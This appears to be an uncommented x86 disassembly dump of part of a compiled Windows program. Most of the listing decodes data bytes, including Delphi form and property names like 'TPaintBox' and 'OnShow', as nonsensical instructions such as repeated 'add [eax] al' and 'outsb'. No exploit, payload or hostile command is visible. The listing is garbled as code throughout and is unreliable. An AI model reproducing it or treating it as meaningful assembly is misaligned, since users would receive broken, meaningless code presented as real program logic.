cmovb eax [ eax ]
lodsb [ esi ]
xor al 0x40
add [ eax ] dh
or [ edx ] eax
mov ah 0x34
inc eax
add ah cl
stosd [ edi ]
inc esp
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ eax + 0x6c0045ed ] dh
fild [ eax + eax - 0x6c ]
mov [ 0xffffffff8b4c0044 ] eax
inc ecx
add [ eax + ecx * 4 ] dl
inc esp
add [ esp + ebx * 2 ] dh
inc esp
add [ eax - 0x70 ] cl
inc esp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
fmul [ edx + eax * 2 ]
add ah dl
or al 0x42
add ah bh
cmovb eax [ eax ]
push 0x800045f5
salc
inc esp
add [ ebx + ebx * 8 - 0x2517ffbc ] bl
inc esp
add [ eax - 0x3ffbba6 ] ch
rol [ eax + eax + 0x1c ] 0x1
rol [ eax + eax + 0x34 ] 0x1
into
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add ah ah
mov [ eax + eax + 0x10 ] eax
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax ] bh
inc sp
add [ ecx + ebp * 2 + 0x44 ] cl
add al bh
inc esp
add [ eax - 0x56 ] ch
inc esp
add [ edx + ecx * 4 - 0x3177ffbc ] dl
inc esp
add [ edi + ecx * 8 + 0x44 ] al
add [ eax - 0x36 ] al
inc esp
add [ eax ] ch
iretd
sub_45bba6
inc esp
add [ eax - 0xc ] ch
inc ebp
add [ esi + ebp * 8 ] bh
inc ebp
add ah dh
movsb [ edi ] [ esi ]
inc esp
add al cl
cmc
inc ebp
add ah bl
mov eax [ 0xffffffffedfc0044 ]
inc ebp
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ eax ] bh
scasb [ edi ]
inc esp
add [ edx + 0x44 ] bl
add ah ah
int3
sub_45bc78
mov eax 0x10045ef
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
str [ edx ]
inc ecx
jne r-xdata
adc al 0x2a
inc esp
add [ ecx + eax ] ah
outsd
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ ecx + 0x75 ] al
je r-xdata
jne r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
bound eax [ ecx ]
add bh bh
lodsb [ esi ]
fld [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
adc [ eax ] eax
or al [ edx + 0x65 ]
jbe r-xdata
add bh bh
sbb dh dh
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax + eax ] dl
or [ edx + 0x65 ] eax
jbe r-xdata
insb
inc ebp
jae r-xdata
hlt
jb r-xdata
add [ ebx + 0x1 ] ah
add bh bh
push 0x10044dd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
sub al [ eax + eax + 0x65 ]
add [ eax ] eax
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
push 0xfcff0001
fld [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ edx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
sub al [ eax + eax + 0x63 ]
add [ eax ] eax
[ eax - 0x23 ]
add bh bh
jpe r-xdata
je r-xdata
add [ eax ] al
adc eax 0x65420a00
jbe r-xdata
insb
dec ecx
outsb
outsb
jb r-xdata
add [ eax + 0x430b0018 ] al
outsd
outsb
jae r-xdata
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
mov [ eax + 0x44 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb al [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add [ eax ] al
inc [ ecx ]
insb
sub [ gs : esp + eax * 2 ] bl
add [ eax + eax ] dh
[ esp + ecx * 4 ]
add [ eax ] al
add [ ebx ] dl
add [ edx ] cl
inc edx
jbe r-xdata
[ eax - 0x23 ]
sub al [ eax + eax + 0x64 ]
add [ eax ] eax
add [ ebp ] bl
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
inc [ ecx + ebp * 2 ]
jae r-xdata
add [ eax + 0x42080016 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xa865646f
mov edx 0x2200045
insb
dec edi
add [ eax ] al
add [ ebx ] bl
add [ eax ] cl
inc esp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x40100073
add [ eax + 0x30ff0001 ] ch
mov esp 0x10044
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb [ eax ] eax
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
inc eax
adc al 0x44
adc [ eax ] al
movsd [ edi ] [ esi ]
add [ eax ] eax
call [ ecx + edx * 8 - 0x2e47ffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001f ] al
je r-xdata
inc esp
add [ eax ] ah
imul eax [ eax + eax ] 0x800000
add [ eax ] al
add bh bh
add al 0x69
jb r-xdata
sbb [ esi ] 0x0
add eax 0x6f6c6f43
jb r-xdata
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
popad
arpl [ ebx + 0x67 ] bp
jb r-xdata
xor eax [ eax + edi * 2 + 0x23 ]
inc edx
add [ eax ] ch
add bh bh
pop eax
push 0x68680044
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040020 ] al
outsd
outsb
je r-xdata
add [ edx ] bh
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ edx + esi * 2 + 0x61 ] al
sbb al [ eax + eax - 0x65 ]
add [ eax ] al
[ ebx + 0x1ff0000 ]
je r-xdata
jne r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
inc esi
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
sub [ ecx + 0x44 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
test [ esi + 0x44 ] ah
add ah dl
xchg [ eax + eax ] eax
jo r-xdata
adc [ eax ] al
0xd8ff0000 0x4468
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : esi ] cl
outsb
je r-xdata
sub [ edi ] 0x0
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
jpe r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ eax + 0x10044d2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub al [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsb
je r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
add [ eax ] al
js r-xdata
add [ eax ] al
push esp
pop eax
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x10656c62
and al [ eax + eax - 0x40 ]
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002c ] al
outsb
inc ebx
popad
outsb
push edx
jae r-xdata
adc [ eax ] al
push edi
add [ eax ] al
inc [ esi - 0x782bffbc ]
inc esp
add [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
push [ eax + ebp * 2 + 0x687c0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080028 ] al
push 0x6948776f
outsb
je r-xdata
rol [ eax + eax + 0x70 ] 0x1
rol [ eax + eax + 0x1 ] cl
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] al
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
outsb
adc [ eax ] al
test eax 0xc4ff0001
rol [ eax + eax + 0x1 ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
rcr [ esi ] 0x1
push eax
outsd
jo r-xdata
add [ eax ] al
cmp bh 0xff
sbb eax [ eax + eax - 0x10 ]
add [ eax ] al
add [ eax ] al
inc esp
add [ ecx ] al
jo r-xdata
pop ecx
inc ebp
add [ eax + eax ] bh
[ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50090027 ] al
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
imul ebp [ esi + 0x74 ] r-xdata
outsd
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ ecx ] cl
push eax
outsb
je r-xdata
inc edi
je r-xdata
push esp
dec edi
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
inc esp
add al ch
push ds
add [ eax ] al
jo r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
in al 0x1c
inc esp
add al ah
add [ eax ] al
jmp eax
imul esi [ ebp + 0x49 ] 0xe46f666e
sbb al 0x44
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003a ] al
outsb
dec edi
jb r-xdata
jb r-xdata
jo r-xdata
add [ eax + 0x4f0a0032 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop eax
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
jb r-xdata
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
nop
push 0x10044
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
and eax 0x61500a00
insb
cwde
and eax [ eax + eax + 0x40 ]
add [ eax ] eax
inc [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] dl
dec edi
outsb
inc esp
outsd
ja r-xdata
dec ebp
outsd
jne r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al [ eax ]
or ecx [ edi + 0x6e ]
pop eax
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060038 ] al
outsb
inc ebp
js r-xdata
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x78 ] bp
pop ds
pop ds
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090035 ] al
outsb
xor eax [ eax ]
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
and [ eax + eax - 0x48 ] al
add [ eax ] eax
push ebx
je r-xdata
push edi
pop esp
sbb eax 0xd80044
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax [ eax ]
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
outsb
inc ebp
outsb
inc esp
inc esp
jb r-xdata
outsd
outsd
imul esi [ ebx + ebp * 2 ] 0x41
add [ ecx ] al
movsd [ edi ] [ esi ]
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x30 ] bp
pop ds
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0042 ] al
cwde
and eax [ eax + eax + 0x48 ]
add [ eax ] eax
dec [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ esi ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
push 0x446c6565
outsd
ja r-xdata
dec ebp
outsd
jbe r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0900
and [ eax + eax - 0x30 ] eax
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0039 ] al
outsb
pop eax
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
invd
dec ecx
insb
inc esi
add bh bh
dec [ ebx + 0x45c44cc0 ]
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
add [ edi ] cl
or [ ecx + 0x4f ] cl
inc ebp
jb r-xdata
inc esp
jb r-xdata
push edi
push 0x556c6565
jo r-xdata
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
js r-xdata
push ds
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
insd
dec esp
adc [ eax ] eax
add ecx eax
loope r-xdata
ficom [ edx - 0x30 ]
adc [ esi - 0x50dfff5a ] ebx
dec edi
int3
outsb
push ebx
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ ebx ] cl
dec edi
pop eax
inc ecx
add al bh
add [ eax ] al
jb r-xdata
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4f070037 ] al
add [ eax ] al
dec edi
jbe r-xdata
outsd
jb r-xdata
inc eax
add ah cl
les eax [ ebp ]
add ecx [ ebx ]
push esp
inc edx
outsd
jb r-xdata
cmp eax 0x4605da82
outsd
jb r-xdata
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
int 0xda
add [ ebx ] al
add [ eax ] al
add al cl
les eax [ ebp ]
or al 0x62
imul edx [ ebx + 0x79 ] 0x6d657473
jae r-xdata
outsb
inc ebp
outsb
je r-xdata
push eax
outsd
jb r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
dec [ ebp - 0x3b83ffc0 ]
inc ebp
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
add bh bh
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
outsb
jne r-xdata
push ebx
je r-xdata
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsb
je r-xdata
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax ] dh
lds eax [ ebp ]
or dh [ eax + 0x6f ]
inc esp
jae r-xdata
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
jb r-xdata
push cs
jo r-xdata
mov eax eax
sbb al 0xc5
inc esi
outsd
jb r-xdata
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax - 0x3c ] bh
inc ebp
add [ eax ] cl
jae r-xdata
push es
add eax 0x6d726f46
jae r-xdata
jb r-xdata
jb r-xdata
inc esi
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
jo r-xdata
jb r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
outsd
add [ eax ] al
add eax [ eax ]
add [ eax ] al
int3
inc esp
popa
jne r-xdata
insb
jns r-xdata
jae r-xdata
bound ebp [ ecx + 0x53 ]
jns r-xdata
outsd
jb r-xdata
mov [ ebp ] 0x6
inc eax
add [ esi + eax * 8 + 0xb080045 ] dh
push esp
push cs
mov [ ebp ] 0x3
or edx [ eax + edx * 2 + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add eax 0x6d726f46
jo r-xdata
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] ah
arpl [ ecx + 0x6c ] sp
inc ebx
outsb
je r-xdata
rol ch 0x1
inc ebp
add [ ebx ] al
andps xmm0 [ ebp + 0x66 ]
je r-xdata
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
adc [ eax + 0x6f ] dh
jo r-xdata
jae r-xdata
les eax [ ebp ]
nop
xor al 0xc5
inc ebp
add [ ebx ] al
or [ eax + edx * 2 + 0x6f ] edx
enter 0x45c4 0x0
add [ eax ] al
add ah cl
lds eax [ ebp ]
or [ ebp + ebp * 2 + 0x44 ] esp
jae r-xdata
je r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
rcr [ eax * 8 + 0xc060045 ] 0x54
insb
je r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
outsd
mov ah 0xc6
inc ebp
add [ eax ] cl
jo r-xdata
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
inc ebx
insb
push eax
jb r-xdata
inc ebx
jne r-xdata
lds eax [ ebp ]
push esp
push eax
dec edi
ja r-xdata
outsb
je r-xdata
jb r-xdata
je r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
nop
insd
popad
jb r-xdata
popad
dec ebp
inc esp
jae r-xdata
je r-xdata
je r-xdata
add ecx [ edi ]
push esp
imul edi [ edx + 0x65 ] 0x796c6e4f
je r-xdata
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
dec ebp
insd
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] ch
inc eax
add [ eax ] al
adc [ eax ] al
nop
cmp al 0xc7
inc ebp
add [ eax ] cl
jae r-xdata
outsb
je r-xdata
jae r-xdata
jo r-xdata
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
jb r-xdata
jb r-xdata
arpl [ ecx + 0x4e ] sp
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add [ eax - 0x3a ] ch
inc ebp
add [ esi ] al
inc esi
outsd
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
inc esp
popa
inc esp
popa
jne r-xdata
outsd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
push 0x60045c6
inc esi
outsd
jb r-xdata
jae r-xdata
jb r-xdata
jo r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
push 0xdc0045b8
add [ esp + eax * 2 ] al
popad
je r-xdata
cmovb eax [ eax ]
in al dx
test [ ebp ] r-xdata
mov ah 0x34
inc eax
outsb
add [ eax ] dl
inc eax
add [ eax ] al
adc [ eax ] 0x40
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
sbb al 0xc8
inc ebp
jbe r-xdata
add cl [ eax ]
push es
jb r-xdata
adc [ eax + 0x6f ] esi
push ecx
jne r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
insd
outsd
jo r-xdata
add [ eax ] al
and dh al
inc ebp
add [ esi ] al
jae r-xdata
popad
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] ch
inc eax
add [ eax - 0x3a ] ch
inc ebp
add [ ebp - 0x3907ffc0 ] cl
inc ebp
add [ eax ] cl
adc [ ebx + eax * 2 + 0x6c ] dl
outsd
jae r-xdata
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
insb
mov [ ebp ] 0x3
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
inc ebp
add [ esi ] al
or al 0x54
jns r-xdata
add ah bl
pop es
dec ecx
outsb
je r-xdata
outsd
insb
popad
outsb
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
popad
outsb
add [ eax ] al
jb r-xdata
outsd
jae r-xdata
outsd
outsd
insb
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
add [ esi + ebx ] cl
inc esi
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ eax ] cl
cli
inc ebp
add [ ebx + ebx * 8 + 0x44 ] ch
add [ eax - 0x1 ] bh
inc ebp
add [ ebx + ecx * 4 + 0x41 ] cl
add al cl
sti
inc ebp
add [ esp + edi * 8 ] al
inc ebp
add [ eax ] dl
std
inc ebp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
mov [ 0xcd40046 ] al
inc edx
add [ eax ] ch
inc ecx
inc esi
add [ eax - 0xa ] ah
inc ebp
add [ eax - 0x63ffbb2a ] al
fild [ eax + eax - 0x18 ]
fiadd [ eax + eax - 0x58 ]
pop edx
inc esp
add ah bh
rol [ eax + eax + 0x68 ] 0x1
add al [ esi ]
xor al 0xce
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add [ ebx + eax + 0x46 ] bl
add [ eax ] dl
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax + 0x5 ] dl
inc esi
add [ esp + eax ] bl
inc esi
add al bh
inc esp
add al cl
add eax 0x8a940046
inc esp
add [ eax + 0x440044ce ] cl
iretd
mov al [ 0xffffffffb40045f9 ]
xor al 0x40
jb r-xdata
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
outsb
je r-xdata
push cs
push esp
push ebx
push 0x4374726f
jne r-xdata
inc ebp
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
jo r-xdata
inc ebp
jbe r-xdata
jb r-xdata
lea eax [ eax ]
int3
inc esi
outsd
jb r-xdata
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
dec eax
popad
outsb
insb
pop es
inc edx
pop es
or edx [ ebx + eax * 2 + 0x6c ]
mov [ ebp ] 0x8
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
leave
inc ebp
add [ edx + ecx * 8 + 0x45 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor cl cl
push esp
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x37e3ffc0 ] cl
jbe r-xdata
add [ eax ] al
add [ eax ] al
adc [ eax ] al
js r-xdata
outsb
je r-xdata
lds eax [ ebp ]
add ecx [ ecx ]
push esp
jae r-xdata
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
inc ebp
add [ edx - 0x7ffba36 ] ah
add al [ eax ]
add [ eax - 0x48 ] ch
inc ebp
add [ eax ] al
add [ eax ] al
add [ edx ] dh
leave
outsb
je r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_45c8a6
inc esp
add [ eax - 0xc ] ch
inc ebp
add [ esp + ecx + 0x46 ] ch
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ eax ] dh
sbb [ esi ] eax
nop
sbb al 0x46
add [ ebx + ebx + 0x46 ] cl
add [ ebp - 0x5a6fffbc ] cl
inc esp
add al cl
sbb eax 0xa3f00046
inc esp
add [ eax - 0x30 ] ch
inc esp
add [ esp - 0x1da3ffba ] bh
inc esp
add ah ah
int3
sub_45c8de
inc esp
add al dl
cmp [ esi ] eax
pop esp
out dx al
inc ebp
add [ ecx + esi * 8 ] cl
inc ebp
add [ eax - 0x13ffb9d6 ] dh
cli
inc ebp
add [ eax - 0x5 ] ch
inc ebp
add [ eax + 0x2400463d ] dh
clc
inc ebp
add [ eax + edi + 0x1f940046 ] dh
inc esi
add [ eax + 0x3a ] ch
inc esi
add [ ebp + eax + 0x46 ] cl
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x23c0040 ] ch
add [ eax ] al
adc al 0xc4
inc ebp
add [ eax + 0x2 ] dl
add [ eax ] al
dec eax
les eax [ ebp ]
add al [ fs : eax ]
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
sub_45cad8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and ah cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 8 ] dl
inc ebp
add al bh
add al [ eax ]
add al dl
mov [ ebp ] sub_420fdc
in al dx
test [ ebp ] r-xdata
mov ah 0x34
inc eax
add [ esi + ebx ] cl
inc esi
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ eax ] cl
cli
inc ebp
add [ ebx + ebx * 8 + 0x44 ] ch
add [ eax - 0x1 ] bh
inc ebp
add [ ebx + ecx * 4 + 0x41 ] cl
add al cl
sti
inc ebp
add [ esp + edi * 8 ] al
inc ebp
add [ eax ] dl
std
inc ebp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
mov [ 0xcd40046 ] al
inc edx
add [ eax ] ch
inc ecx
inc esi
add [ eax - 0xa ] ah
inc ebp
add [ eax - 0x63ffbb2a ] al
fild [ eax + eax - 0x18 ]
fiadd [ eax + eax - 0x58 ]
pop edx
inc esp
add ah bh
rol [ eax + eax + 0x68 ] 0x1
add al [ esi ]
xor al 0xce
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add [ ebx + eax + 0x46 ] bl
add [ eax ] dl
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
